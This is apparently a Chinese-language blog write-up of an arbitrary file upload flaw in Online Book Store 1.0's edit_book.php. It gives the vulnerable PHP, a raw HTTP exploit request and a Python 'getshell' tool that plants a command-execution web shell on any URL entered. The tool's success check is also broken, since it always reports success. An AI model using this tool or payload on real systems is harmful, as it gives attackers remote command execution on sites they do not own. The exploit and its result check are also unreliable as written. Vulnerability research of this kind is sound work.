---
title: online-book-Getshell
published: true
---
# [](#header-1)零.前言:
本篇文章将会写 Online Book Store 1.0 的前台任意文件上传漏洞分析,复现,及工具的编写!
小弟第一次接触代码审计，请大家见谅!
Online Book Store 1.0 是国外某书城cms.
# [](#header-1)一.漏洞分析:
首先咱们用 **Seay源代码审计工具** 对程序进行自动审计!

![](https://m4tir.github.io/assets/Online/1.png)

发现/edit_book.php这个文件可能存在文件上传漏洞

```php
<?php	
	// if save change happen
	if(!isset($_POST['save_change'])){
		echo "Something wrong!";
		exit;
	}

	$isbn = trim($_POST['isbn']);
	$title = trim($_POST['title']);
	$author = trim($_POST['author']);
	$descr = trim($_POST['descr']);
	$price = floatval(trim($_POST['price']));
	$publisher = trim($_POST['publisher']);

	if(isset($_FILES['image']) && $_FILES['image']['name'] != ""){ //未过滤的文件上传
		$image = $_FILES['image']['name'];
		$directory_self = str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']);
		$uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . $directory_self . "bootstrap/img/";
		$uploadDirectory .= $image;
		move_uploaded_file($_FILES['image']['tmp_name'], $uploadDirectory);
	}

```

发现里边存在未过滤的文件上传点

只需要对文件post传参,传入**isbn,author,save_change**这三个参数即可进行上传!

其中**isbn和author**两个参数能自定义,**save_change**这个参数固定值:**Change**

# [](#header-1)二.漏洞复现:

![](https://m4tir.github.io/assets/Online/2.png)

![](https://m4tir.github.io/assets/Online/3.png)

exp:

```html
POST /online-book/edit_book.php HTTP/1.1
Host: 192.168.1.2
Proxy-Connection: keep-alive
Content-Length: 521
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary="I am lonely"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

--I am lonely
Content-Disposition: form-data; name="isbn"

978-1-49192-706-9
--I am lonely
Content-Disposition: form-data; name="author"

mstir
--I am lonely
Content-Disposition: form-data; name="image"; filename="test.php"
Content-Type: application/octet-stream

<?phpinfo();?>
--I am lonely
Content-Disposition: form-data; name="save_change"

Change
--I am lonely--
```

# [](#header-1)三.工具编写:

```python
# -*- coding: utf-8 -*-
import requests

#上传shell
print('\b')
url = input("请输入目标网址:")
requrl = url + '/edit_book.php'#任意文件上传的地址
backdoor_file = {
    "image": (
        "mstir.php",
        '<?php system($_GET["cmd"]); ?>',
        "Content-Type: application/octet-stream",
    )
}#文件上传的数据
backdoor_data = {
	"isbn": "978-1-49192-706-9","author":"mstir","save_change":"Change",
}#文件上传所需的参数,其中isbn和author两个量都是自己随便取的
print (' ____          __  __     _   _')
print ('| __ ) _   _  |  \/  |___| |_(_)_ __')
print ("|  _ \| | | | | |\/| / __| __| | '__|")
print ("| |_) | |_| | | |  | \__ \ |_| | |")
print ("|____/ \__, | |_|  |_|___/\__|_|_|")
print ("       |___/")
Getbao = requests.post(
     url=requrl, files=backdoor_file,data=backdoor_data
)#进行post发包上传文件

#验证shell
shell_url = url + "/bootstrap/img/" + "mstir.php"
Verification = requests.get(url=shell_url)
shell_code = Verification.status_code
print ("shell_code:",shell_code)#验证打印出shell状态码
if {shell_code == "200"}:#判断shell是否成功上传
	print ("Getshell成功! Shell:" + url + "/bootstrap/img/mstir.php")
else:
	print ("Getsehll失败!")
```

![](https://m4tir.github.io/assets/Online/4.png) 
